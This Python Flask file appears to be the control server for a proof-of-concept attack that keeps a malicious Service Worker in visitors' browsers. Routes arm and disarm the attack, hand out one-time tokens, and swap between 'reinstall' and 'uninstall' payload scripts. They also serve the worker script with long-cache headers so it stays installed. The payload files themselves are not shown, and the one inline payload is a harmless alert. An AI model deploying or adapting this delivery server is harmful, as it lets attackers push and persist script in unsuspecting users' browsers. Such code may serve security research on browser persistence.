from flask import Flask, send_from_directory, make_response, request
from time import sleep, time
import os
app = Flask(__name__)

ATTACK = False
TOKEN = None

HEADERS = {
    'Content-Type': 'text/html',
    'Access-Control-Allow-Origin': '*',
    'Cache-Control': 'no-cache'
}

DOMAIN = "cyber-koko.herokuapp.com"


@app.route("/")
def index():
    response = make_response(send_from_directory(path='./', filename="index.html"))
    return response

@app.route("/attackOn")
def attackOn():
    global ATTACK, TOKEN
    TOKEN = os.urandom(16).hex()
    ATTACK = True
    response = make_response("<html>Attack On</html>")
    response.headers = HEADERS
    return response

@app.route("/setReinstall")
def setReinstall():
    os.system("cp app/reinstall.js app/payload.js")
    response = make_response("<html>Reinstall payload is set</html>")
    response.headers = HEADERS
    return response

@app.route("/setUninstall")
def setUninstall():
    os.system("cp app/uninstall.js app/payload.js")
    response = make_response("<html>Uninstall payload is set</html>")
    response.headers = HEADERS
    return response



@app.route("/attackOff")
def attackOff():
    global ATTACK
    ATTACK = False
    response = make_response("<html>Attack Off</html>")
    response.headers = HEADERS
    return response


@app.route("/isattack")
def isattack():
    # sleep(5)
    global ATTACK, TOKEN
    if ATTACK:
        # response = make_response(f"https://{DOMAIN}/payload/{TOKEN}")
        # response = make_response("https://cyber.koko.com/attack")
        response = make_response("alert('cyber')")
        ATTACK = False
    else:
        response = make_response("")
    response.headers = HEADERS
    return response

@app.route("/attack")
def attack():
    # sleep(5)
    global ATTACK
    if ATTACK:
        response = make_response(send_from_directory('./', filename="attack.html"))
        ATTACK = False
    else:
        response = make_response("")
    response.headers = HEADERS

    return response


@app.route("/indexeddb")
def indexeddb():
    response = make_response(send_from_directory(path='./', filename="indexedDB.html"))
    response.headers = HEADERS
    return response


@app.route("/cooldown")
def cooldown():
    response = make_response(send_from_directory(path='./', filename="cooldown.html"))
    response.headers = HEADERS
    return response

@app.route("/createSW")
def createSW():
    response = make_response(send_from_directory(path='./', filename="createSW.html"))
    response.headers = HEADERS
    return response


@app.route("/uninstallSW")
def uninstallSW():
    response = make_response(send_from_directory(path='./', filename="uninstallSW.html"))
    response.headers = HEADERS
    return response

@app.route("/ServiceWorker")
def update():
    # sleep(5)
    response = make_response(send_from_directory(path='./', filename="update.js"))
    response.headers = {
      'Content-Type': 'text/javascript;charset=UTF-8',
      'Access-Control-Allow-Origin': '*',
      'Cache-Control': 'private, max-age=3600',
      'ETag': '33a64df551425fcc55e4d42a148795d9f25f89d4'
    }
    return response

@app.route("/payloadwithtoken/<path:token>")
def payloadwithtoken(token):
    # sleep(5)
    global TOKEN, ATTACK
    if (ATTACK and TOKEN and (TOKEN==token)):
        response = make_response(send_from_directory(path='./', filename="payload.html"))
        ATTACK = False
        TOKEN = None
    else:
        response = make_response("")
    response.headers = HEADERS
    return response

@app.route("/payload")
def payload():
    response = make_response(send_from_directory(path='./', filename="payload.js"))
    response.headers = {
        'Content-Type': 'text/javascript;charset=UTF-8',
        'Access-Control-Allow-Origin': '*',
        'Cache-Control': 'no-cache'
    }
    return response